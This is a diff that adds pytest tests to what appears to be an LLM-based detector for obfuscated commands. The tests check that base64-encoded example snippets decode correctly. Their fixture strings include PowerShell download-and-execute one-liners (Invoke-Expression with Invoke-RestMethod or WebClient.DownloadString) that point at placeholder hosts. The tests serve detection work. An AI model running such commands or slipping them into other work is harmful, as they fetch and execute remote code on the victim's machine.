@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64
 import json
 
 import pytest
@@ -218,3 +219,90 @@ class TestChunking:
         find_obfuscation(content, provider)
 
         assert provider.calls[0]["images"] == [b"fakepngbytes"]
+
+
+class TestExampleSnippetDecoding:
+    """`example_snippet_b64` (see `prompts.py` rule #3 / `engine.detect
+    ._decode_example_snippet`) exists specifically so a verbatim copy of
+    messy real-world command-line text never has to survive JSON's own
+    string-escaping rules -- base64 output can never contain a quote,
+    backslash, or line break, so it can't break the JSON it's embedded in no
+    matter what the original text looked like. This is the fix for a real
+    production bug: a live scan against a real threat-intel blog failed
+    twice with "Expecting ',' delimiter" from an unescaped quote inside a
+    plain `example_snippet` string, even after `_parsing.py` gained a
+    dedicated repair pass for that exact shape (see test_parsing.py) --
+    that repair pass helps but can't be made airtight against every way a
+    model can mis-escape manually, so this removes the need for the model
+    to escape at all for this field.
+    """
+
+    def _b64(self, text: str) -> str:
+        return base64.b64encode(text.encode("utf-8")).decode("ascii")
+
+    def test_base64_encoded_snippet_is_decoded(self, mock_provider_factory):
+        finding = wildcard_finding_dict("f1")  # already base64-encoded via conftest's _b64
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet == "&(Get-Alias i*x) (irm https://example.com/a)"
+
+    def test_snippet_containing_literal_quotes_round_trips_correctly(self, mock_provider_factory):
+        # The exact real-world shape that broke JSON parsing before this
+        # fix: a verbatim PowerShell snippet containing an embedded,
+        # unescaped double-quote (a string literal inside the obfuscated
+        # command itself). Base64-encoding it means the surrounding JSON
+        # response never contains this quote as a raw character at all --
+        # nothing to escape, nothing to get wrong.
+        real_snippet = 'iex (New-Object Net.WebClient).DownloadString("http://x")'
+        finding = wildcard_finding_dict("f1")
+        finding["example_snippet_b64"] = self._b64(real_snippet)
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet == real_snippet
+
+    def test_snippet_with_backslashes_and_newlines_round_trips_correctly(self, mock_provider_factory):
+        real_snippet = 'gal i*x\r\n$c = "C:\\Users\\x" -replace "\\\\", "/"\n& $c'
+        finding = wildcard_finding_dict("f1")
+        finding["example_snippet_b64"] = self._b64(real_snippet)
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet == real_snippet
+
+    def test_plain_text_example_snippet_still_works_for_leniency(self, mock_provider_factory):
+        # A model that ignores the schema and returns the old plain-text
+        # `example_snippet` key anyway shouldn't lose the finding entirely.
+        finding = wildcard_finding_dict("f1")
+        del finding["example_snippet_b64"]
+        finding["example_snippet"] = "&(Get-Alias i*x) (irm https://example.com/a)"
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet == "&(Get-Alias i*x) (irm https://example.com/a)"
+
+    def test_invalid_base64_falls_back_to_raw_value_not_dropped(self, mock_provider_factory):
+        # A model asked for base64 that returns raw text in that field
+        # anyway (ignoring the instruction) shouldn't lose the finding --
+        # degrade to using it verbatim rather than discarding real signal.
+        finding = wildcard_finding_dict("f1")
+        finding["example_snippet_b64"] = "not actually base64! ###"
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet == "not actually base64! ###"
+
+    def test_null_snippet_stays_none(self, mock_provider_factory):
+        finding = wildcard_finding_dict("f1")
+        finding["example_snippet_b64"] = None
+        provider = mock_provider_factory(responses=[detection_response_json([finding])])
+
+        findings = find_obfuscation(_content(), provider)
+
+        assert findings[0].example_snippet is None
